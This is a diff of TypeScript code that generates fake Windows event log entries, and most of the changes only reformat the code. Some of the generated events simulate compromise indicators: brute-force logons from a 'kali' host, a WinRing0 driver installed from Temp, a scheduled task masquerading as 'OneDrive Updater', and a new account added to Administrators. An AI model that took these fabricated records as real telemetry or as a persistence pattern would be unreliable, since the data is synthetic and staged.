+              "MicrosoftAccount:user=alex@outlook.com",
+              "Shellmosaic/ssh:prod-bastion",
+            ]),
+          ],
+          ["Type", "0"],
+          ["CountOfCredentialsReturned", "1"],
+          ["ReadOperation", "%%8100"],
+          ["ReturnCode", "0"],
+          ["ProcessCreationTime", new Date(t - 3600000).toISOString()],
+          ["ClientProcessId", "14388"],
+        ],
+        message:
+          "Credential Manager credentials were read.\n\nSubject:\n\tSecurity ID:\t\t" +
+          USER_SID +
+          "\n\tAccount Name:\t\talex\n\tAccount Domain:\t\t" +
+          HOST +
+          "\n\tLogon ID:\t\t0xBC0A1\n\tRead Operation:\t\tEnumerate Credentials\n\nThis event occurs when a user performs a read operation on stored credentials in Credential Manager.",
       };
     case 4648:
       return {
@@ -605,7 +939,16 @@ const securityMaker: Maker = (r, t) => {
         eventId: 4648,
         task: 12544,
         taskName: "Logon",
-        data: [...subject(USER_SID, USER, HOST, "0xBC0A1"), ["TargetUserName", "svc-backup"], ["TargetDomainName", "CONTOSO"], ["TargetServerName", "fs01.contoso.local"], ["ProcessId", "0x1e44"], ["ProcessName", "C:\\Windows\\System32\\runas.exe"], ["IpAddress", "-"], ["IpPort", "-"]],
+        data: [
+          ...subject(USER_SID, USER, HOST, "0xBC0A1"),
+          ["TargetUserName", "svc-backup"],
+          ["TargetDomainName", "CONTOSO"],
+          ["TargetServerName", "fs01.contoso.local"],
+          ["ProcessId", "0x1e44"],
+          ["ProcessName", "C:\\Windows\\System32\\runas.exe"],
+          ["IpAddress", "-"],
+          ["IpPort", "-"],
+        ],
         message: `A logon was attempted using explicit credentials.\n\nSubject:\n\tSecurity ID:\t\t${USER_SID}\n\tAccount Name:\t\t${USER}\n\nAccount Whose Credentials Were Used:\n\tAccount Name:\t\tsvc-backup\n\tAccount Domain:\t\tCONTOSO\n\nTarget Server:\n\tTarget Server Name:\tfs01.contoso.local\n\nProcess Information:\n\tProcess ID:\t\t0x1e44\n\tProcess Name:\t\tC:\\Windows\\System32\\runas.exe`,
       };
     case 4776: {
@@ -616,7 +959,12 @@ const securityMaker: Maker = (r, t) => {
         eventId: 4776,
         task: 14336,
         taskName: "Credential Validation",
-        data: [["PackageName", "MICROSOFT_AUTHENTICATION_PACKAGE_V1_0"], ["TargetUserName", bad ? pick(r, BAD_USERS) : USER], ["Workstation", bad ? "kali" : HOST], ["Status", bad ? "0xc0000064" : "0x0"]],
+        data: [
+          ["PackageName", "MICROSOFT_AUTHENTICATION_PACKAGE_V1_0"],
+          ["TargetUserName", bad ? pick(r, BAD_USERS) : USER],
+          ["Workstation", bad ? "kali" : HOST],
+          ["Status", bad ? "0xc0000064" : "0x0"],
+        ],
         message: `The computer attempted to validate the credentials for an account.\n\nAuthentication Package:\tMICROSOFT_AUTHENTICATION_PACKAGE_V1_0\nLogon Account:\t${bad ? "admin" : USER}\nSource Workstation:\t${bad ? "kali" : HOST}\nError Code:\t${bad ? "0xC0000064" : "0x0"}`,
       };
     }
@@ -627,8 +975,18 @@ const securityMaker: Maker = (r, t) => {
         eventId: 4697,
         task: 12289,
         taskName: "Security System Extension",
-        data: [...subject(USER_SID, USER, HOST, "0xBC0A1"), ["ServiceName", "WinRing0_1_2_0"], ["ServiceFileName", "C:\\Users\\alex\\AppData\\Local\\Temp\\WinRing0x64.sys"], ["ServiceType", "0x1"], ["ServiceStartType", "3"], ["ServiceAccount", ""]],
-        message: "A service was installed in the system.\n\nSubject:\n\tSecurity ID:\t\t" + USER_SID + "\n\tAccount Name:\t\talex\n\nService Information:\n\tService Name:\t\tWinRing0_1_2_0\n\tService File Name:\tC:\\Users\\alex\\AppData\\Local\\Temp\\WinRing0x64.sys\n\tService Type:\t\t0x1\n\tService Start Type:\t3\n\tService Account:\t\t",
+        data: [
+          ...subject(USER_SID, USER, HOST, "0xBC0A1"),
+          ["ServiceName", "WinRing0_1_2_0"],
+          ["ServiceFileName", "C:\\Users\\alex\\AppData\\Local\\Temp\\WinRing0x64.sys"],
+          ["ServiceType", "0x1"],
+          ["ServiceStartType", "3"],
+          ["ServiceAccount", ""],
+        ],
+        message:
+          "A service was installed in the system.\n\nSubject:\n\tSecurity ID:\t\t" +
+          USER_SID +
+          "\n\tAccount Name:\t\talex\n\nService Information:\n\tService Name:\t\tWinRing0_1_2_0\n\tService File Name:\tC:\\Users\\alex\\AppData\\Local\\Temp\\WinRing0x64.sys\n\tService Type:\t\t0x1\n\tService Start Type:\t3\n\tService Account:\t\t",
       };
     case 4698:
       return {
@@ -637,8 +995,18 @@ const securityMaker: Maker = (r, t) => {
         eventId: 4698,
         task: 12804,
         taskName: "Other Object Access Events",
-        data: [...subject(USER_SID, USER, HOST, "0xBC0A1"), ["TaskName", "\\OneDrive Updater"], ["TaskContent", '<?xml version="1.0" encoding="UTF-16"?><Task version="1.2"><Actions Context="Author"><Exec><Command>C:\\Users\\alex\\AppData\\Local\\Temp\\upd.exe</Command><Arguments>-silent</Arguments></Exec></Actions></Task>']],
-        message: "A scheduled task was created.\n\nSubject:\n\tSecurity ID:\t\t" + USER_SID + "\n\tAccount Name:\t\talex\n\nTask Information:\n\tTask Name: \t\t\\OneDrive Updater\n\tTask Content: \t\t<Exec><Command>C:\\Users\\alex\\AppData\\Local\\Temp\\upd.exe</Command><Arguments>-silent</Arguments></Exec>",
+        data: [
+          ...subject(USER_SID, USER, HOST, "0xBC0A1"),
+          ["TaskName", "\\OneDrive Updater"],
+          [
+            "TaskContent",
+            '<?xml version="1.0" encoding="UTF-16"?><Task version="1.2"><Actions Context="Author"><Exec><Command>C:\\Users\\alex\\AppData\\Local\\Temp\\upd.exe</Command><Arguments>-silent</Arguments></Exec></Actions></Task>',
+          ],
+        ],
+        message:
+          "A scheduled task was created.\n\nSubject:\n\tSecurity ID:\t\t" +
+          USER_SID +
+          "\n\tAccount Name:\t\talex\n\nTask Information:\n\tTask Name: \t\t\\OneDrive Updater\n\tTask Content: \t\t<Exec><Command>C:\\Users\\alex\\AppData\\Local\\Temp\\upd.exe</Command><Arguments>-silent</Arguments></Exec>",
       };
     case 4720:
     case 4732: {
@@ -650,11 +1018,32 @@ const securityMaker: Maker = (r, t) => {
         task: added ? 13826 : 13824,
         taskName: added ? "Security Group Management" : "User Account Management",
         data: added
-          ? [["MemberName", "-"], ["MemberSid", "S-1-5-21-3623811015-3361044348-30300820-1004"], ["TargetUserName", "Administrators"], ["TargetDomainName", "Builtin"], ["TargetSid", "S-1-5-32-544"], ...subject(USER_SID, USER, HOST, "0xBC0A1"), ["PrivilegeList", "-"]]
-          : [["TargetUserName", "support_tmp"], ["TargetDomainName", HOST], ["TargetSid", "S-1-5-21-3623811015-3361044348-30300820-1004"], ...subject(USER_SID, USER, HOST, "0xBC0A1"), ["SamAccountName", "support_tmp"], ["DisplayName", "%%1793"], ["UserAccountControl", "\n\t\t%%2080\n\t\t%%2082\n\t\t%%2084"]],
+          ? [
+              ["MemberName", "-"],
+              ["MemberSid", "S-1-5-21-3623811015-3361044348-30300820-1004"],
+              ["TargetUserName", "Administrators"],
+              ["TargetDomainName", "Builtin"],
+              ["TargetSid", "S-1-5-32-544"],
+              ...subject(USER_SID, USER, HOST, "0xBC0A1"),
+              ["PrivilegeList", "-"],
+            ]
+          : [
+              ["TargetUserName", "support_tmp"],
+              ["TargetDomainName", HOST],
+              ["TargetSid", "S-1-5-21-3623811015-3361044348-30300820-1004"],
+              ...subject(USER_SID, USER, HOST, "0xBC0A1"),
+              ["SamAccountName", "support_tmp"],
+              ["DisplayName", "%%1793"],
+              ["UserAccountControl", "\n\t\t%%2080\n\t\t%%2082\n\t\t%%2084"],
+            ],
         message: added
-          ? "A member was added to a security-enabled local group.\n\nSubject:\n\tSecurity ID:\t\t" + USER_SID + "\n\tAccount Name:\t\talex\n\nMember:\n\tSecurity ID:\t\tS-1-5-21-3623811015-3361044348-30300820-1004\n\nGroup:\n\tSecurity ID:\t\tS-1-5-32-544\n\tGroup Name:\t\tAdministrators\n\tGroup Domain:\t\tBuiltin"
-          : "A user account was created.\n\nSubject:\n\tSecurity ID:\t\t" + USER_SID + "\n\tAccount Name:\t\talex\n\nNew Account:\n\tSecurity ID:\t\tS-1-5-21-3623811015-3361044348-30300820-1004\n\tAccount Name:\t\tsupport_tmp\n\tAccount Domain:\t\t" + HOST,
+          ? "A member was added to a security-enabled local group.\n\nSubject:\n\tSecurity ID:\t\t" +
+            USER_SID +
+            "\n\tAccount Name:\t\talex\n\nMember:\n\tSecurity ID:\t\tS-1-5-21-3623811015-3361044348-30300820-1004\n\nGroup:\n\tSecurity ID:\t\tS-1-5-32-544\n\tGroup Name:\t\tAdministrators\n\tGroup Domain:\t\tBuiltin"
+          : "A user account was created.\n\nSubject:\n\tSecurity ID:\t\t" +
+            USER_SID +
+            "\n\tAccount Name:\t\talex\n\nNew Account:\n\tSecurity ID:\t\tS-1-5-21-3623811015-3361044348-30300820-1004\n\tAccount Name:\t\tsupport_tmp\n\tAccount Domain:\t\t" +
+            HOST,
       };
     }
     case 4740:
@@ -664,8 +1053,16 @@ const securityMaker: Maker = (r, t) => {
         eventId: 4740,
         task: 13824,
         taskName: "User Account Management",
-        data: [["TargetUserName", "backup"], ["TargetDomainName", "kali"], ["TargetSid", "S-1-5-21-3623811015-3361044348-30300820-1003"], ...subject()],
-        message: "A user account was locked out.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\t" + HOST + "$\n\nAccount That Was Locked Out:\n\tSecurity ID:\t\tS-1-5-21-3623811015-3361044348-30300820-1003\n\tAccount Name:\t\tbackup\n\nAdditional Information:\n\tCaller Computer Name:\tkali",
+        data: [
+          ["TargetUserName", "backup"],
+          ["TargetDomainName", "kali"],
+          ["TargetSid", "S-1-5-21-3623811015-3361044348-30300820-1003"],
+          ...subject(),
+        ],
+        message:
+          "A user account was locked out.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\t" +
+          HOST +
+          "$\n\nAccount That Was Locked Out:\n\tSecurity ID:\t\tS-1-5-21-3623811015-3361044348-30300820-1003\n\tAccount Name:\t\tbackup\n\nAdditional Information:\n\tCaller Computer Name:\tkali",
       };
     default:
       return {
@@ -688,30 +1085,96 @@ const securityMaker: Maker = (r, t) => {
 
 // ── System ───────────────────────────────────────────────────────────────
 
-const SERVICES = ["Windows Update", "Background Intelligent Transfer Service", "WinHTTP Web Proxy Auto-Discovery Service", "Windows Modules Installer", "Microsoft Defender Antivirus Service", "Delivery Optimization", "Windows Error Reporting Service", "Device Setup Manager", "Software Protection", "Google Update Service (gupdate)", "Shellmosaic Elevation Helper", "Diagnostic Policy Service"];
-const SCM = { provider: "Service Control Manager", guid: "{555908d1-a6d7-4695-8e1e-26931d2012f4}", classic: true, qualifiers: 16384, pid: 1004, keywords: "0x8080000000000000", keywordNames: ["Classic"] } as const;
+const SERVICES = [
+  "Windows Update",
+  "Background Intelligent Transfer Service",
+  "WinHTTP Web Proxy Auto-Discovery Service",
+  "Windows Modules Installer",
+  "Microsoft Defender Antivirus Service",
+  "Delivery Optimization",
+  "Windows Error Reporting Service",
+  "Device Setup Manager",
+  "Software Protection",
+  "Google Update Service (gupdate)",
+  "Shellmosaic Elevation Helper",
+  "Diagnostic Policy Service",
+];
+const SCM = {
+  provider: "Service Control Manager",
+  guid: "{555908d1-a6d7-4695-8e1e-26931d2012f4}",
+  classic: true,
+  qualifiers: 16384,
+  pid: 1004,
+  keywords: "0x8080000000000000",
+  keywordNames: ["Classic"],
+} as const;
 
 const systemMaker: Maker = (r, t) => {
-  const id = weighted(r, [7036, 7040, 10016, 1014, 7000, 7023, 7031, 7045, 41, 6008, 6005, 6013, 1, 16, 219, 129, 19, 43, 20, 134, 153, 10010, 1074], [30, 5, 10, 5, 1.5, 1, 1, 0.6, 0.25, 0.25, 1, 1.5, 2, 3, 1, 0.5, 2, 2, 0.4, 1, 0.6, 1, 0.5]);
+  const id = weighted(
+    r,
+    [
+      7036, 7040, 10016, 1014, 7000, 7023, 7031, 7045, 41, 6008, 6005, 6013, 1, 16, 219, 129, 19, 43, 20, 134, 153,
+      10010, 1074,
+    ],
+    [30, 5, 10, 5, 1.5, 1, 1, 0.6, 0.25, 0.25, 1, 1.5, 2, 3, 1, 0.5, 2, 2, 0.4, 1, 0.6, 1, 0.5],
+  );
   const svc = pick(r, SERVICES);
   switch (id) {
     case 7036: {
       const state = pick(r, ["running", "stopped"]);
-      return { ...SCM, eventId: 7036, level: 4, data: [["param1", svc], ["param2", state], ["Binary", "57007500610075007300650072007600"]], message: `The ${svc} service entered the ${state} state.` };
+      return {
+        ...SCM,
+        eventId: 7036,
+        level: 4,
+        data: [
+          ["param1", svc],
+          ["param2", state],
+          ["Binary", "57007500610075007300650072007600"],
+        ],
+        message: `The ${svc} service entered the ${state} state.`,
+      };
     }
     case 7040:
-      return { ...SCM, eventId: 7040, level: 4, sid: USER_SID, data: [["param1", "Background Intelligent Transfer Service"], ["param2", "auto start"], ["param3", "demand start"], ["param4", "BITS"]], message: "The start type of the Background Intelligent Transfer Service service was changed from auto start to demand start." };
+      return {
+        ...SCM,
+        eventId: 7040,
+        level: 4,
+        sid: USER_SID,
+        data: [
+          ["param1", "Background Intelligent Transfer Service"],
+          ["param2", "auto start"],
+          ["param3", "demand start"],
+          ["param4", "BITS"],
+        ],
+        message:
+          "The start type of the Background Intelligent Transfer Service service was changed from auto start to demand start.",
+      };
     case 7000:
     case 7023:
     case 7031: {
-      const s = pick(r, ["Shellmosaic Elevation Helper", "Razer Synapse Service", "vgc", "Intel(R) Dynamic Application Loader Host Interface Service"]);
+      const s = pick(r, [
+        "Shellmosaic Elevation Helper",
+        "Razer Synapse Service",
+        "vgc",
+        "Intel(R) Dynamic Application Loader Host Interface Service",
+      ]);
       const msg =
         id === 7000
           ? `The ${s} service failed to start due to the following error: \nThe system cannot find the file specified.`
           : id === 7023
             ? `The ${s} service terminated with the following error: \nThe device is not ready.`
             : `The ${s} service terminated unexpectedly.  It has done this 1 time(s).  The following corrective action will be taken in 60000 milliseconds: Restart the service.`;
-      return { ...SCM, qualifiers: 49152, eventId: id, level: 2, data: [["param1", s], ["param2", "%%2"]], message: msg };
+      return {
+        ...SCM,
+        qualifiers: 49152,
+        eventId: id,
+        level: 2,
+        data: [
+          ["param1", s],
+          ["param2", "%%2"],
+        ],
+        message: msg,
+      };
     }
     case 7045:
       return {
@@ -719,8 +1182,15 @@ const systemMaker: Maker = (r, t) => {
         eventId: 7045,
         level: 4,
         sid: USER_SID,
-        data: [["ServiceName", "WinRing0_1_2_0"], ["ImagePath", "C:\\Users\\alex\\AppData\\Local\\Temp\\WinRing0x64.sys"], ["ServiceType", "kernel mode driver"], ["StartType", "demand start"], ["AccountName", ""]],
-        message: "A service was installed in the system.\n\nService Name:  WinRing0_1_2_0\nService File Name:  C:\\Users\\alex\\AppData\\Local\\Temp\\WinRing0x64.sys\nService Type:  kernel mode driver\nService Start Type:  demand start\nService Account:  ",
+        data: [
+          ["ServiceName", "WinRing0_1_2_0"],
+          ["ImagePath", "C:\\Users\\alex\\AppData\\Local\\Temp\\WinRing0x64.sys"],
+          ["ServiceType", "kernel mode driver"],
+          ["StartType", "demand start"],
+          ["AccountName", ""],
+        ],
+        message:
+          "A service was installed in the system.\n\nService Name:  WinRing0_1_2_0\nService File Name:  C:\\Users\\alex\\AppData\\Local\\Temp\\WinRing0x64.sys\nService Type:  kernel mode driver\nService Start Type:  demand start\nService Account:  ",
       };
     case 10016:
     case 10010:
@@ -736,7 +1206,13 @@ const systemMaker: Maker = (r, t) => {
         keywords: "0x8080000000000000",
         keywordNames: ["Classic"],
         sid: id === 10016 ? "S-1-5-18" : undefined,
-        data: [["param1", "application-specific"], ["param2", "Local"], ["param3", "Activation"], ["param4", "{2593F8B9-4EAF-457C-B68A-50F6B8EA6B54}"], ["param5", "{15C20B67-12E7-4BB6-92BB-7AFF07997402}"]],
+        data: [
+          ["param1", "application-specific"],
+          ["param2", "Local"],
+          ["param3", "Activation"],
+          ["param4", "{2593F8B9-4EAF-457C-B68A-50F6B8EA6B54}"],
+          ["param5", "{15C20B67-12E7-4BB6-92BB-7AFF07997402}"],
+        ],
         message:
           id === 10016
             ? "The application-specific permission settings do not grant Local Activation permission for the COM Server application with CLSID \n{2593F8B9-4EAF-457C-B68A-50F6B8EA6B54}\n and APPID \n{15C20B67-12E7-4BB6-92BB-7AFF07997402}\n to the user NT AUTHORITY\\SYSTEM SID (S-1-5-18) from address LocalHost (Using LRPC) running in the application container Unavailable SID (Unavailable). This security permission can be modified using the Component Services administrative tool."
@@ -753,8 +1229,13 @@ const systemMaker: Maker = (r, t) => {
         keywords: "0x4000000010000000",
         pid: 2216,
         sid: "S-1-5-20",
-        data: [["QueryName", "wpad"], ["AddressLength", "128"], ["Address", "02000000C0A801010000000000000000"]],
-        message: "Name resolution for the name wpad timed out after none of the configured DNS servers responded.\nClient PID 2216.",
+        data: [
+          ["QueryName", "wpad"],
+          ["AddressLength", "128"],
+          ["Address", "02000000C0A801010000000000000000"],
+        ],
+        message:
+          "Name resolution for the name wpad timed out after none of the configured DNS servers responded.\nClient PID 2216.",
       };
     case 41:
       return {
@@ -768,8 +1249,16 @@ const systemMaker: Maker = (r, t) => {
         keywords: "0x8000400000000002",
         pid: 4,
         sid: "S-1-5-18",
-        data: [["BugcheckCode", "0"], ["BugcheckParameter1", "0x0"], ["PowerButtonTimestamp", "0"], ["SleepInProgress", "0"], ["PowerButtonSuppressed", "false"], ["LongPowerButtonPressDetected", "false"]],
-        message: "The system has rebooted without cleanly shutting down first. This error could be caused if the system stopped responding, crashed, or lost power unexpectedly.",
+        data: [
+          ["BugcheckCode", "0"],
+          ["BugcheckParameter1", "0x0"],
+          ["PowerButtonTimestamp", "0"],
+          ["SleepInProgress", "0"],
+          ["PowerButtonSuppressed", "false"],
+          ["LongPowerButtonPressDetected", "false"],
+        ],
+        message:
+          "The system has rebooted without cleanly shutting down first. This error could be caused if the system stopped responding, crashed, or lost power unexpectedly.",
         taskName: "(63)",
         opcodeName: "Info",
       };
@@ -777,8 +1266,30 @@ const systemMaker: Maker = (r, t) => {
     case 6005:
     case 6013: {
       const level = id === 6008 ? 2 : 4;
-      const msg = id === 6008 ? `The previous system shutdown at ${new Date(t - 90000).toLocaleTimeString()} on ${new Date(t - 90000).toLocaleDateString()} was unexpected.` : id === 6005 ? "The Event log service was started." : `The system uptime is ${int(r, 3600, 900000)} seconds.`;
-      return { provider: "EventLog", classic: true, qualifiers: id === 6008 ? 32768 : 32768, eventId: id, level, pid: 0, keywords: "0x80000000000000", keywordNames: ["Classic"], data: id === 6013 ? [["Data 1", ""], ["Data 2", "60"]] : [], message: msg };
+      const msg =
+        id === 6008
+          ? `The previous system shutdown at ${new Date(t - 90000).toLocaleTimeString()} on ${new Date(t - 90000).toLocaleDateString()} was unexpected.`
+          : id === 6005
+            ? "The Event log service was started."
+            : `The system uptime is ${int(r, 3600, 900000)} seconds.`;
+      return {
+        provider: "EventLog",
+        classic: true,
+        qualifiers: id === 6008 ? 32768 : 32768,
+        eventId: id,
+        level,
+        pid: 0,
+        keywords: "0x80000000000000",
+        keywordNames: ["Classic"],
+        data:
+          id === 6013
+            ? [
+                ["Data 1", ""],
+                ["Data 2", "60"],
+              ]
+            : [],
+        message: msg,
+      };
     }
     case 1:
     case 16:
@@ -795,12 +1306,25 @@ const systemMaker: Maker = (r, t) => {
         sid: id === 1 ? "S-1-5-19" : "S-1-5-18",
         data:
           id === 1
-            ? [["NewTime", new Date(t).toISOString()], ["OldTime", new Date(t - 812).toISOString()], ["Reason", "2"]]
-            : [["HiveNameLength", "40"], ["HiveName", "\\??\\C:\\Users\\alex\\ntuser.dat"], ["KeysUpdated", String(int(r, 20, 900))], ["DirtyPages", String(int(r, 2, 80))]],
+            ? [
+                ["NewTime", new Date(t).toISOString()],
+                ["OldTime", new Date(t - 812).toISOString()],
+                ["Reason", "2"],
+              ]
+            : [
+                ["HiveNameLength", "40"],
+                ["HiveName", "\\??\\C:\\Users\\alex\\ntuser.dat"],
+                ["KeysUpdated", String(int(r, 20, 900))],
+                ["DirtyPages", String(int(r, 2, 80))],
+              ],
         message:
           id === 1
             ? `The system time has changed to ${new Date(t).toISOString()} from ${new Date(t - 812).toISOString()}.\n\nChange Reason: An application or system component changed the time.`
-            : "The access history in hive \\??\\C:\\Users\\alex\\ntuser.dat was cleared updating " + int(r, 20, 900) + " keys and creating " + int(r, 2, 80) + " modified pages.",
+            : "The access history in hive \\??\\C:\\Users\\alex\\ntuser.dat was cleared updating " +
+              int(r, 20, 900) +
+              " keys and creating " +
+              int(r, 2, 80) +
+              " modified pages.",
       };
     case 219:
       return {
@@ -813,16 +1337,41 @@ const systemMaker: Maker = (r, t) => {
         keywords: "0x8000000000000000",
         pid: 4,
         sid: "S-1-5-18",
-        data: [["DriverNameLength", "60"], ["DriverName", "ROOT\\SYSTEM\\0002"], ["Status", "3221226341"], ["FailureNameLength", "18"], ["FailureName", "\\Driver\\WudfRd"], ["Version", "0"]],
+        data: [
+          ["DriverNameLength", "60"],
+          ["DriverName", "ROOT\\SYSTEM\\0002"],
+          ["Status", "3221226341"],
+          ["FailureNameLength", "18"],
+          ["FailureName", "\\Driver\\WudfRd"],
+          ["Version", "0"],
+        ],
         message: "The driver \\Driver\\WudfRd failed to load for the device ROOT\\SYSTEM\\0002.",
         taskName: "(212)",
       };
     case 129:
-      return { provider: "storahci", classic: true, qualifiers: 32772, eventId: 129, level: 3, keywords: "0x80000000000000", keywordNames: ["Classic"], data: [["Data 1", "\\Device\\RaidPort0"], ["Binary", "0F001800010000000000000081000480"]], message: "Reset to device, \\Device\\RaidPort0, was issued." };
+      return {
+        provider: "storahci",
+        classic: true,
+        qualifiers: 32772,
+        eventId: 129,
+        level: 3,
+        keywords: "0x80000000000000",
+        keywordNames: ["Classic"],
+        data: [
+          ["Data 1", "\\Device\\RaidPort0"],
+          ["Binary", "0F001800010000000000000081000480"],
+        ],
+        message: "Reset to device, \\Device\\RaidPort0, was issued.",
+      };
     case 19:
     case 43:
     case 20: {
-      const kb = pick(r, ["Security Intelligence Update for Microsoft Defender Antivirus - KB2267602 (Version 1.421.161.0) - Current Channel (Broad)", "2026-10 Cumulative Update for Windows 11 Version 25H2 for x64-based Systems (KB5048667)", "Windows Malicious Software Removal Tool x64 - v5.130 (KB890830)", "NVIDIA - Display - 32.0.15.6614"]);
+      const kb = pick(r, [
+        "Security Intelligence Update for Microsoft Defender Antivirus - KB2267602 (Version 1.421.161.0) - Current Channel (Broad)",
+        "2026-10 Cumulative Update for Windows 11 Version 25H2 for x64-based Systems (KB5048667)",
+        "Windows Malicious Software Removal Tool x64 - v5.130 (KB890830)",
+        "NVIDIA - Display - 32.0.15.6614",
+      ]);
       return {
         provider: "Microsoft-Windows-WindowsUpdateClient",
         guid: "{945a8954-c147-4acd-923f-40c45405a658}",
@@ -837,8 +1386,19 @@ const systemMaker: Maker = (r, t) => {
         keywordNames: ["Installation", "Success"],
         pid: 7312,
         sid: "S-1-5-18",
-        data: [["updateTitle", kb], ["updateGuid", "{c71f53b2-21f3-4f19-9e15-3b0a2a3f5e13}"], ["updateRevisionNumber", "200"], ["serviceGuid", "{7971f918-a847-4430-9279-4a52d1efe18d}"], ...(id === 20 ? ([["errorCode", "0x80073712"]] as [string, string][]) : [])],
-        message: id === 19 ? `Installation Successful: Windows successfully installed the following update: ${kb}` : id === 43 ? `Installation Started: Windows has started installing the following update: ${kb}` : `Installation Failure: Windows failed to install the following update with error 0x80073712: ${kb}.`,
+        data: [
+          ["updateTitle", kb],
+          ["updateGuid", "{c71f53b2-21f3-4f19-9e15-3b0a2a3f5e13}"],
+          ["updateRevisionNumber", "200"],
+          ["serviceGuid", "{7971f918-a847-4430-9279-4a52d1efe18d}"],
+          ...(id === 20 ? ([["errorCode", "0x80073712"]] as [string, string][]) : []),
+        ],
+        message:
+          id === 19
+            ? `Installation Successful: Windows successfully installed the following update: ${kb}`
+            : id === 43
+              ? `Installation Started: Windows has started installing the following update: ${kb}`
+              : `Installation Failure: Windows failed to install the following update with error 0x80073712: ${kb}.`,
       };
     }
     case 134:
@@ -851,12 +1411,30 @@ const systemMaker: Maker = (r, t) => {
         keywords: "0x8000000000000000",
         pid: 2740,
         sid: "S-1-5-19",
-        data: [["TimeSource", "time.windows.com,0x9"], ["ErrorMessage", "No such host is known. (0x80072AF9)"], ["RetryMinutes", "15"]],
-        message: "NtpClient was unable to set a manual peer to use as a time source because of DNS resolution error on 'time.windows.com,0x9'. NtpClient will try again in 15 minutes and double the reattempt interval thereafter. The error was: No such host is known. (0x80072AF9)",
+        data: [
+          ["TimeSource", "time.windows.com,0x9"],
+          ["ErrorMessage", "No such host is known. (0x80072AF9)"],
+          ["RetryMinutes", "15"],
+        ],
+        message:
+          "NtpClient was unable to set a manual peer to use as a time source because of DNS resolution error on 'time.windows.com,0x9'. NtpClient will try again in 15 minutes and double the reattempt interval thereafter. The error was: No such host is known. (0x80072AF9)",
       };
     case 153:
       // a driver without message files: raw XML, no RenderingInfo
-      return { provider: "nvlddmkm", classic: true, qualifiers: 49316, eventId: 153, level: 2, keywords: "0x80000000000000", data: [["Data 1", "\\Device\\Video3"], ["Data 2", "Error occurred on GPUID: 100"], ["Binary", "000000000300000000000000000000000000000000000000"]], message: null };
+      return {
+        provider: "nvlddmkm",
+        classic: true,
+        qualifiers: 49316,
+        eventId: 153,
+        level: 2,
+        keywords: "0x80000000000000",
+        data: [
+          ["Data 1", "\\Device\\Video3"],
+          ["Data 2", "Error occurred on GPUID: 100"],
+          ["Binary", "000000000300000000000000000000000000000000000000"],
+        ],
+        message: null,
+      };
     default:
       return {
         provider: "User32",
@@ -868,7 +1446,15 @@ const systemMaker: Maker = (r, t) => {
         keywordNames: ["Classic"],
         sid: USER_SID,
         pid: 6512,
-        data: [["param1", "C:\\Windows\\system32\\shutdown.exe (" + HOST + ")"], ["param2", HOST], ["param3", "No title for this reason could be found"], ["param4", "0x800000ff"], ["param5", "restart"], ["param6", ""], ["param7", ME]],
+        data: [
+          ["param1", "C:\\Windows\\system32\\shutdown.exe (" + HOST + ")"],
+          ["param2", HOST],
+          ["param3", "No title for this reason could be found"],
+          ["param4", "0x800000ff"],
+          ["param5", "restart"],
+          ["param6", ""],
+          ["param7", ME],
+        ],
         message: `The process C:\\Windows\\system32\\shutdown.exe (${HOST}) has initiated the restart of computer ${HOST} on behalf of user ${ME} for the following reason: No title for this reason could be found\n Reason Code: 0x800000ff\n Shutdown Type: restart\n Comment: `,
       };
   }
@@ -877,11 +1463,36 @@ const systemMaker: Maker = (r, t) => {
 // ── Application ──────────────────────────────────────────────────────────
 
 const applicationMaker: Maker = (r, t) => {
-  const id = weighted(r, [16384, 16394, 1000, 1001, 1002, 1026, 1040, 1033, 8224, 15, 1534, 326, 327, 0, 9027, 1], [8, 4, 2, 3, 0.6, 1, 2, 1.5, 2, 2, 2, 2, 2, 3, 1, 2]);
+  const id = weighted(
+    r,
+    [16384, 16394, 1000, 1001, 1002, 1026, 1040, 1033, 8224, 15, 1534, 326, 327, 0, 9027, 1],
+    [8, 4, 2, 3, 0.6, 1, 2, 1.5, 2, 2, 2, 2, 2, 3, 1, 2],
+  );
   switch (id) {
     case 16384:
     case 16394:
-      return { provider: "Microsoft-Windows-Security-SPP", guid: "{e23b33b0-c8c9-472c-a5f9-f2bdfea0f156}", classic: true, qualifiers: 16384, eventId: id, level: 4, keywords: "0x80000000000000", keywordNames: ["Classic"], pid: 0, data: id === 16384 ? [["Data 1", new Date(t + 3600000 * 24 * 30).toISOString()], ["Data 2", "RulesEngine"]] : [], message: id === 16384 ? `Successfully scheduled Software Protection service for re-start at ${new Date(t + 3600000 * 24 * 30).toISOString()}. Reason: RulesEngine.` : "Offline downlevel migration succeeded." };
+      return {
+        provider: "Microsoft-Windows-Security-SPP",
+        guid: "{e23b33b0-c8c9-472c-a5f9-f2bdfea0f156}",
+        classic: true,
+        qualifiers: 16384,
+        eventId: id,
+        level: 4,
+        keywords: "0x80000000000000",
+        keywordNames: ["Classic"],
+        pid: 0,
+        data:
+          id === 16384
+            ? [
+                ["Data 1", new Date(t + 3600000 * 24 * 30).toISOString()],
+                ["Data 2", "RulesEngine"],
+              ]
+            : [],
+        message:
+          id === 16384
+            ? `Successfully scheduled Software Protection service for re-start at ${new Date(t + 3600000 * 24 * 30).toISOString()}. Reason: RulesEngine.`
+            : "Offline downlevel migration succeeded.",
+      };
     case 1000:
     case 1002: {
       const app = pick(r, ["cs2.exe", "explorer.exe", "loader.exe", "Discord.exe", "steamwebhelper.exe"]);
@@ -896,7 +1507,16 @@ const applicationMaker: Maker = (r, t) => {
         taskName: id === 1000 ? "Application Crashing Events" : "Hanging Events",
         keywords: "0x80000000000000",
         keywordNames: ["Classic"],
-        data: [["AppName", app], ["AppVersion", "1.40.3.8"], ["AppTimeStamp", "67102c1a"], ["ModuleName", app === "loader.exe" ? "hook64.dll" : "ntdll.dll"], ["ModuleVersion", "10.0.26100.2161"], ["ExceptionCode", "c0000005"], ["FaultingOffset", "00000000000a3f41"], ["ProcessId", hx(int(r, 0x400, 0x7000))]],
+        data: [
+          ["AppName", app],
+          ["AppVersion", "1.40.3.8"],
+          ["AppTimeStamp", "67102c1a"],
+          ["ModuleName", app === "loader.exe" ? "hook64.dll" : "ntdll.dll"],
+          ["ModuleVersion", "10.0.26100.2161"],
+          ["ExceptionCode", "c0000005"],
+          ["FaultingOffset", "00000000000a3f41"],
+          ["ProcessId", hx(int(r, 0x400, 0x7000))],
+        ],
         message:
           id === 1000
